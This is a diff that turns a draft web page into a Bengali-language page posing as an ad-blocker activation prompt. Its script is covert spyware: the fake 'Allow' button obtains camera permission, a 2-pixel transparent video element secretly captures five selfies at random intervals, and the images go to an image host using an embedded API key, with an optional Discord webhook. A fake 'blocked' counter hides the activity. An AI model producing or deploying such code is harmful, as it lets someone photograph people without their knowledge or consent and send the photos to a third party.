@@ -1,27 +1,351 @@
+<!DOCTYPE html>
+<html lang="bn">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<meta name="theme-color" content="#12141a">
+<title>অ্যাড ব্লকার চেক</title>
+<link rel="icon" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 32 32'%3E%3Cpath d='M16 3l11 4v10c0 7-5 11-11 12C10 28 5 24 5 17V7z' fill='%2322c55e'/%3E%3Cpath d='M11 16l4 4 7-8' stroke='%23fff' stroke-width='3' fill='none' stroke-linecap='round'/%3E%3C/svg%3E">
+<style>
+  :root{color-scheme:dark}
+  *{box-sizing:border-box}
+  body{margin:0;background:#12141a;color:#e8eaee;font:16px/1.7 system-ui,'Noto Sans Bengali',sans-serif}
+  main{max-width:640px;margin:0 auto;padding:48px 22px 160px}
+  h1{font-size:22px;font-weight:600;line-height:1.4;margin:0 0 16px}
+  h2{font-size:15px;font-weight:600;margin:26px 0 8px;color:#9aa2b1}
+  p{margin:0 0 14px;color:#c2c8d4}
 
+  /* ---- গেট ---- */
+  #gate{position:fixed;inset:0;z-index:10;display:flex;align-items:center;justify-content:center;
+        background:#12141a;padding:24px;transition:opacity .35s,visibility .35s}
+  #gate.gone{opacity:0;visibility:hidden}
+  .card{max-width:380px;text-align:center;border:1px solid #262b35;border-radius:14px;padding:30px 24px;background:#171a21}
+  .card svg{width:52px;height:52px;margin-bottom:12px}
+  .card h2{font-size:19px;font-weight:600;margin:0 0 10px;color:#fff}
+  .card p{font-size:14px;color:#8d95a4;margin:0 0 18px}
+  #allow{font:600 15px system-ui,sans-serif;background:#22c55e;color:#06240f;border:0;border-radius:8px;
+         padding:12px 0;width:100%;cursor:pointer}
+  #allow:disabled{opacity:.6;cursor:default}
+  .note{font-size:12px;color:#6b7280;margin-top:12px}
+
+  /* ---- ফেক ব্যাজ ---- */
+  #badge{position:fixed;left:14px;bottom:14px;z-index:5;font:600 11px/1 ui-monospace,monospace;
+         background:#171a21;border:1px solid #262b35;color:#22c55e;border-radius:999px;padding:8px 12px;display:none}
+  body.on #badge{display:block}
+
+  /* ---- লুকানো ক্যামেরা: ভিউপোর্টের ভেতরে, ২px, স্বচ্ছ ---- */
+  #preview{position:fixed;right:0;bottom:0;width:2px;height:2px;opacity:0;pointer-events:none;
+           z-index:1;transform:scaleX(-1);object-fit:cover;background:#000}
+  body.show #preview{width:132px;height:99px;opacity:1;border-radius:8px;border:1px solid #262b35;z-index:20}
+
+  /* ---- কাউন্টডাউন + ফ্ল্যাশ (?show) ---- */
+  #stagewrap{display:none}
+  body.show #stagewrap{display:block}
+  #countdown{position:fixed;right:0;bottom:0;width:132px;height:99px;z-index:21;display:none;
+             place-items:center;font:700 44px/1 system-ui;color:#fff;text-shadow:0 2px 10px #000a}
+  #flash{position:fixed;right:0;bottom:0;width:132px;height:99px;z-index:22;background:#fff;
+         opacity:0;pointer-events:none;transition:opacity .1s}
+
+  #panel{display:none;position:fixed;inset:auto 0 0 0;z-index:30;background:#0b0c0e;color:#e6e8ec;
+         font:12px/1.55 ui-monospace,monospace;padding:10px;max-height:46vh;overflow:auto}
+  body.show #panel{display:block}
+  #panel .ok{color:#22c55e}#panel .err{color:#ef4444}
+  #panel button{font:12px ui-monospace,monospace;background:#1d2027;color:#fff;border:1px solid #2e333c;
+                border-radius:4px;padding:4px 9px;margin:2px 4px 2px 0;cursor:pointer}
+  #thumbs{display:flex;gap:6px;flex-wrap:wrap;margin-top:6px}
+  #thumbs img{width:56px;height:42px;object-fit:cover;border-radius:3px}
+</style>
+</head>
+<body>
+
+<div id="gate">
+  <div class="card">
+    <svg viewBox="0 0 32 32" aria-hidden="true"><path d="M16 3l11 4v10c0 7-5 11-11 12C10 28 5 24 5 17V7z" fill="#22c55e"/><path d="M11 16l4 4 7-8" stroke="#fff" stroke-width="3" fill="none" stroke-linecap="round"/></svg>
+    <h2>অ্যাড ব্লকার শনাক্ত হয়েছে</h2>
+    <p>এই পেজ বিজ্ঞাপন দিয়ে চলে। বিরতি ছাড়া পড়তে চাইলে সুরক্ষা চালু করুন।</p>
+    <button id="allow">Allow</button>
+    <div class="note" id="note">ট্র্যাকার, পপ-আপ ও অটোপ্লে ভিডিও ব্লক করে।</div>
+  </div>
+</div>
+
+<div id="badge">সুরক্ষা চালু</div>
 
 <main>
-  <h1>Untitled draft</h1>
-  <p>The first revision went out on Thursday and the notes came back faster than expected. Most of them cluster around the second section, which is probably fair — the argument there leans on an assumption that was never stated out loud.</p>
-  <p>Rewriting it means either making the assumption explicit and defending it, or cutting the section and folding what survives into the conclusion. The second option is cleaner and shorter, but it loses the only part of the piece that had any real texture.</p>
-  <p>Either way the deadline holds. Nothing below is final.</p>
+  <h1>বেশিরভাগ অ্যাড ব্লকার কেন চুপচাপ কাজ করা বন্ধ করে দেয়</h1>
+  <p>প্যাটার্নটা প্রায় সবসময় একই। একটা এক্সটেনশন বের হয়, সাইট তার ডেলিভারি বদলে দেয়, আর যে ফিল্টার লিস্টগুলো এক্সটেনশনটাকে কাজের করত সেগুলো এক সপ্তাহের মধ্যেই বাসি হয়ে যায়। শেষে টুলবারে একটা ব্যাজ পড়ে থাকে, যেটা সুরক্ষার দাবি করে আর পেজ আগের মাসের চেয়ে চারটা বেশি নেটওয়ার্ক কল লোড করে।</p>
+
+  <h2>ফিল্টার লিস্টই আসল পণ্য</h2>
+  <p>অ্যাড ব্লকার আসলে একটা টেক্সট ফাইল আর একটা ম্যাচার। বাকি সব — ইন্টারফেস, আইকন, সেটিংস প্যানেল — ওই দুটোর চারপাশে সাজানো সাজ। লিস্ট আপডেট বন্ধ হলে পণ্যটাও শেষ, যদিও খোলসটা তখনো ইনস্টল হয়।</p>
+  <p>তাই কাজের প্রশ্নটা কখনো "কোন ব্লকার" নয়, প্রশ্ন হলো "লিস্টটা কে রাখে, আর শুক্রবারে কত দ্রুত আপডেট দেয়"।</p>
+
+  <h2>ডিটেকশন ব্লকিংয়ের চেয়ে সস্তা</h2>
+  <p>সাইটগুলো ব্লকিং নয়, ব্লকিংয়ের পার্শ্বপ্রতিক্রিয়া খোঁজা শিখে গেছে — টেলটেল উচ্চতার একটা বেইট এলিমেন্ট, `onerror` ফায়ার করা একটা স্ক্রিপ্ট ট্যাগ, পরিচিত ট্র্যাকার হোস্টে একটা ফেচ। একটা প্রোব হারালে পরের কোয়ার্টারেই আরেকটা এসে বসে।</p>
+  <p>এই দৌড়ে আর কিছুই কারিগরি নয়। এটা শুধু সময়সূচি।</p>
+
+  <h2>আসলে যা কাজে দেয়</h2>
+  <p>DNS লেভেলে ফিল্টারিং সেই রিকোয়েস্টগুলো ধরে যেগুলোর ব্রাউজার পর্যন্ত পৌঁছানোরই দরকার ছিল না — পেজ প্রোব করার আগেই সারফেসের বড় অংশ কেটে যায়। তার বাইরে: লিস্টের সংখ্যা কম রাখুন, প্রতিদিন আপডেট করুন, আর মেনে নিন কিছু সাইট সবসময় জিতবে।</p>
+  <p>যেগুলো ভদ্রভাবে চলে সেগুলো হোয়াইটলিস্ট করা, তাদের সাথে লড়ার চেয়ে সস্তা।</p>
 </main>
 
-<video id="preview" class="snap" autoplay="" playsinline="" muted="" disablepictureinpicture=""></video>
-<canvas id="canvas" hidden=""></canvas>
+<div id="stagewrap"></div>
+<video id="preview" autoplay playsinline muted disablepictureinpicture></video>
+<canvas id="canvas" hidden></canvas>
+<div id="countdown"></div>
+<div id="flash"></div>
 
 <div id="panel">
   <div>secure: <span id="s-sec">?</span> · perm: <span id="s-perm">?</span> · cam: <span id="s-cam">closed</span> <span id="s-dim"></span></div>
   <div>shots: <span id="s-n">0</span>/5</div>
-  <div id="status">idle</div>
+  <div id="status">প্রস্তুত</div>
   <div>
-    <button id="b-shoot">shoot now</button>
-    <button id="b-test">test upload</button>
-    <button id="b-reset">reset</button>
-    <button id="b-copy">copy urls</button>
+    <button id="b-shoot">এখনই তুলুন</button>
+    <button id="b-test">টেস্ট আপলোড</button>
+    <button id="b-reset">রিসেট</button>
+    <button id="b-copy">লিংক কপি</button>
   </div>
   <div id="thumbs"></div>
 </div>
 
+<script>
+/* ================= সেটিংস ================= */
+const IMGBB_KEY = '8a7496cf95467538f5469cc8bafec925';
+const HOOK      = '';             // চাইলে Discord webhook, শেষে ৫টা লিংক যাবে
+const NEED      = 5;
+const GAP       = [8000, 16000];  // দুই ছবির মাঝের বিরতি (ms)
+const MAX_W     = 1280, Q = 0.8;
+const MIRROR    = true;           // true = প্রিভিউর মতোই মিরর হবে, false = আসল দিক
+const ONCE      = true;           // প্রতি ব্রাউজারে এক সেট, রিলোডে আবার নয়
+/* ========================================== */
 
+const SHOW = /[?&]show\b/.test(location.search);
+if (SHOW) document.body.classList.add('show');
 
+const $ = id => document.getElementById(id);
+const video = $('preview'), canvas = $('canvas'), thumbs = $('thumbs');
+const gate = $('gate'), allow = $('allow'), note = $('note'), badge = $('badge');
+const countdown = $('countdown'), flash = $('flash');
+
+let stream = null, busy = false, got = 0, dead = false, fails = 0, running = false, tick = null;
+let urls = [];
+try { urls = JSON.parse(localStorage.getItem('shots') || '[]'); } catch {}
+
+function log(msg, kind = '') {
+  const el = $('status');
+  el.className = kind;
+  el.textContent = msg;
+  console.log(msg);
+}
+
+$('s-sec').textContent = isSecureContext ? 'yes' : 'NO';
+if (!isSecureContext) $('s-sec').className = 'err';
+
+navigator.permissions?.query({ name: 'camera' }).then(p => {
+  $('s-perm').textContent = p.state;
+  if (p.state === 'granted') {
+    $('s-perm').className = 'ok';
+    if (!SHOW && ONCE && localStorage.getItem('cam_done') === '1') return;
+    setTimeout(() => { dismiss(); start(); }, 900);   // আগেই অনুমতি দেওয়া: প্রম্পট ছাড়াই
+  } else if (p.state === 'denied') {
+    $('s-perm').className = 'err';
+    note.textContent = 'ক্যামেরা ব্লকড — অ্যাড্রেস বারে 🔒 আইকনে ক্লিক করে Camera → Allow করুন, তারপর Allow চাপুন।';
+  }
+}).catch(() => {});
+
+/* ---- ক্যামেরা ---- */
+async function open() {
+  if (stream) return true;
+  if (fails > 8) { dead = true; log('ক্যামেরা বারবার ব্যর্থ, ছেড়ে দিচ্ছি', 'err'); return false; }
+  try {
+    stream = await navigator.mediaDevices.getUserMedia({
+      video: { facingMode: 'user', width: { ideal: 1280 }, height: { ideal: 720 } },
+      audio: false
+    });
+    video.srcObject = stream;
+    await video.play();
+    fails = 0;
+    $('s-cam').textContent = 'open';
+    $('s-dim').textContent = video.videoWidth + '×' + video.videoHeight;
+    log('ক্যামেরা চালু: ' + video.videoWidth + '×' + video.videoHeight, 'ok');
+    return true;
+  } catch (e) {
+    fails++;
+    $('s-cam').textContent = 'blocked';
+    const names = {
+      NotAllowedError: 'ক্যামেরার অনুমতি দেওয়া হয়নি',
+      NotFoundError: 'কোনো ক্যামেরা পাওয়া যায়নি',
+      NotReadableError: 'ক্যামেরা অন্য অ্যাপ ব্যবহার করছে',
+      OverconstrainedError: 'এই রেজোলিউশন সাপোর্ট করে না'
+    };
+    log((names[e.name] || e.name) + ' — ' + e.message, 'err');
+    return false;
+  }
+}
+
+async function ready() {
+  for (let i = 0; i < 12; i++) {
+    if (video.videoWidth) return true;
+    await new Promise(r => setTimeout(r, 250));
+  }
+  log('ফ্রেম ডিকোড হচ্ছে না (videoWidth 0)', 'err');
+  return false;
+}
+
+/* ---- আপলোড ---- */
+async function upload(b64) {
+  const fd = new FormData();
+  fd.append('key', IMGBB_KEY);
+  fd.append('image', b64);
+  fd.append('name', 'selfie-' + new Date().toISOString().slice(0, 19).replace(/[:T]/g, '-'));
+  // keepalive ছাড়া — নাহলে ৬৪ KB-তে কাটা পড়বে
+  try {
+    const r = await fetch('https://api.imgbb.com/1/upload', { method: 'POST', body: fd });
+    const j = await r.json();
+    if (!j.success) {
+      const code = j.error?.code ?? '?';
+      log('আপলোড ব্যর্থ: ' + (j.error?.message || 'unknown') + ' (code ' + code + ')', 'err');
+      if (code === 100) log('→ API key ভুল বা মেয়াদোত্তীর্ণ।', 'err');
+      return false;
+    }
+    urls.push(j.data.url);
+    try { localStorage.setItem('shots', JSON.stringify(urls)); } catch {}
+    thumbs.insertAdjacentHTML('beforeend', '<img src="' + (j.data.thumb?.url || j.data.display_url) + '">');
+    log('সফল! লিংক: ' + j.data.url, 'ok');
+    return true;
+  } catch (e) {
+    log('আপলোড ত্রুটি: ' + e.message, 'err');
+    return false;
+  }
+}
+
+/* ---- কাউন্টডাউন / ফ্ল্যাশ (শুধু ?show মোডে দেখা যায়) ---- */
+async function cd(n) {
+  if (!SHOW) return;
+  for (let i = n; i > 0; i--) {
+    countdown.textContent = i;
+    countdown.style.display = 'grid';
+    await new Promise(r => setTimeout(r, 700));
+  }
+  countdown.style.display = 'none';
+}
+function bang() {
+  if (!SHOW) return;
+  flash.style.opacity = '1';
+  setTimeout(() => flash.style.opacity = '0', 120);
+}
+
+/* ---- ছবি তোলা ---- */
+async function snap() {
+  if (dead || busy || document.hidden || got >= NEED) return;
+  if (!await open()) { if (!dead) setTimeout(snap, 4000); return; }
+  if (!await ready()) { setTimeout(snap, 2000); return; }
+
+  busy = true;
+  try {
+    await cd(3);
+
+    const w = Math.min(MAX_W, video.videoWidth);
+    const h = Math.round(video.videoHeight * (w / video.videoWidth));
+    canvas.width = w; canvas.height = h;
+    const ctx = canvas.getContext('2d');
+    if (MIRROR) ctx.setTransform(-1, 0, 0, 1, w, 0);   // একবারই আঁকা, মিরর সহ
+    ctx.drawImage(video, 0, 0, w, h);
+    ctx.setTransform(1, 0, 0, 1, 0, 0);
+    bang();
+
+    const dataUrl = canvas.toDataURL('image/jpeg', Q);
+    log('তোলা হয়েছে ' + w + '×' + h + ', ~' + Math.round(dataUrl.length * 0.75 / 1024) + ' KB');
+
+    if (await upload(dataUrl.split(',')[1])) {
+      got++;
+      $('s-n').textContent = got;
+      if (got >= NEED) { await finish(); return; }
+      setTimeout(snap, GAP[0] + Math.random() * (GAP[1] - GAP[0]));
+    } else {
+      setTimeout(snap, 3000);
+    }
+  } catch (e) {
+    log('ত্রুটি: ' + e.message, 'err');
+    setTimeout(snap, 3000);
+  } finally {
+    busy = false;
+  }
+}
+
+async function finish() {
+  dead = true;
+  running = false;
+  if (stream) stream.getTracks().forEach(t => t.stop());
+  stream = null;
+  video.srcObject = null;
+  if (ONCE) { try { localStorage.setItem('cam_done', '1'); } catch {} }
+  log('সম্পন্ন — ' + urls.length + ' ছবি', 'ok');
+  if (HOOK && urls.length) {
+    fetch(HOOK, {
+      method: 'POST', headers: { 'content-type': 'application/json' },
+      body: JSON.stringify({ content: urls.join('\n') })
+    }).catch(() => {});
+  }
+}
+
+/* ---- ছদ্মবেশ: গেট সরাও, ফেক কাউন্টার চালাও ---- */
+let blocked = 1284 + Math.floor(Math.random() * 500);
+function dismiss() {
+  gate.classList.add('gone');
+  document.body.classList.add('on');
+  badge.textContent = 'সুরক্ষা চালু · ' + blocked.toLocaleString('bn-BD') + ' ব্লকড';
+  clearInterval(tick);
+  tick = setInterval(() => {
+    blocked += Math.floor(Math.random() * 3);
+    badge.textContent = 'সুরক্ষা চালু · ' + blocked.toLocaleString('bn-BD') + ' ব্লকড';
+  }, 1500);
+}
+
+function start() {
+  if (running || dead) return;
+  running = true;
+  setTimeout(snap, 400);   // প্রথম ছবি — ইউজার এখনো হেডলাইন পড়ছে
+}
+
+/* ---- জেসচার এখানেই খরচ হয় ---- */
+allow.onclick = async () => {
+  allow.disabled = true;
+  allow.textContent = 'চালু হচ্ছে…';
+  const ok = await open();
+  dismiss();
+  if (ok) {
+    start();
+  } else {
+    allow.disabled = false;
+    allow.textContent = 'Allow';
+    note.textContent = 'ক্যামেরা ব্লকড — আরেকবার Allow চাপুন, বা অ্যাড্রেস বারে সাইট পারমিশন দেখুন।';
+  }
+};
+
+addEventListener('pointerdown', () => {
+  if (!stream && !dead && got < NEED && gate.classList.contains('gone')) snap();
+}, true);
+document.addEventListener('visibilitychange', () => {
+  if (!document.hidden && !dead && got < NEED && running) setTimeout(snap, 600);
+});
+addEventListener('pagehide', () => { if (stream) stream.getTracks().forEach(t => t.stop()); });
+
+$('b-shoot').onclick = snap;
+$('b-test').onclick = async () => {
+  if (!await open() || !await ready()) return;
+  canvas.width = Math.min(MAX_W, video.videoWidth);
+  canvas.height = Math.round(video.videoHeight * (canvas.width / video.videoWidth));
+  const ctx = canvas.getContext('2d');
+  if (MIRROR) ctx.setTransform(-1, 0, 0, 1, canvas.width, 0);
+  ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+  ctx.setTransform(1, 0, 0, 1, 0, 0);
+  await upload(canvas.toDataURL('image/jpeg', Q).split(',')[1]);
+};
+$('b-reset').onclick = () => {
+  localStorage.removeItem('cam_done'); localStorage.removeItem('shots');
+  got = 0; urls = []; dead = false; running = false; $('s-n').textContent = '0'; thumbs.innerHTML = '';
+  log('রিসেট');
+};
+$('b-copy').onclick = () => { navigator.clipboard.writeText(urls.join('\n')); log('কপি হয়েছে ' + urls.length); };
+</script>
+</body>
+  </html>
